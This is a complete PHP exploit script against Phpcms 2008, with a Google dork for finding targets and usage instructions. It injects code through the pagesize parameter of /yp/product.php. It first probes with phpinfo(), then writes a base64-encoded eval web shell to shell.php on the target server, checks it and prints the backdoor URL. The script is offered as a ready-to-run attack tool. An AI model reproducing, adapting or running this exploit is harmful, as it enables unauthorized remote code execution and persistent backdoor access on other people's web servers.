#!/usr/bin/php
<?php
print_r('
+---------------------------------------------------------------------------+
PHPCMS Remote Code Inject GetShell Exploit
Google Dork:Powered by Phpcms 2008
code by secr
+---------------------------------------------------------------------------+
');
if ($argc < 3) {
    print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path
host:      target server (ip/hostname)
path:      path to phpcms
Example:
php '.$argv[0].' localhost /phpcms/
+---------------------------------------------------------------------------+
');
    exit;
}
error_reporting(0);  
set_time_limit(0); 
$host = $argv[1];
$path = $argv[2];
$exp ='/yp/product.php?view_type=1&catid=&pagesize={${fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}}&areaname=0&order=';
 
 
//检测是否存在漏洞
echo "[+] Try to determine the Bug....\n";
$returnstr=httpRequestGET('/yp/product.php?view_type=1&catid=&pagesize={${phpinfo()}}&areaname=&order=');
if(preg_match('/(php.ini)/i',$returnstr)){
   echo("[+] This site has Bug!We Will Be Try To Exploit It\n");
    }
    else
    {
    exit("[-] Exploit Failed! This site has No Bug!\n");
}
//如果存在漏洞，就发送EXP Getshell
echo "[+] Try to create webshell....\n";
    httpRequestGET($exp);
    $content=httpRequestGET("/yp/shell.php");
//发送EXP后，在获取的shell检测时候页面里有OK字符，如果有，则GETWebshell成功。
//print_r($content);
if(strpos($content,'ok')){
    echo "[+] Expoilt successfully....\n";
    echo "[+] Webshell:http://$host{$path}yp/shell.php\n";
}else{
    exit("[-] Exploit Failed!\n");
}
 
//模拟POST或者GET请求函数。
function httpRequestGET($url){
    global  $host, $path;
    $method=$method?'POST':'GET';
    $payload = $method." ".$path.$url." HTTP/1.1\r\n";
    $payload .= "Accept: */*\r\n"; 
    $payload .= "User-Agent: Payb-Agent\r\n"; 
    $payload .= "Host: " . $host . "\r\n"; 
    $payload .= "Connection: Close\r\n\r\n"; 
    $fp = fsockopen(gethostbyname($host), 80);
    if (!$fp) {
        echo 'No response from '.$host; die;
    }
    fputs($fp, $payload);
        $resp = '';
            while ($fp && !feof($fp))
        $resp .= fread($fp, 1024);
    return $resp; 
}
?>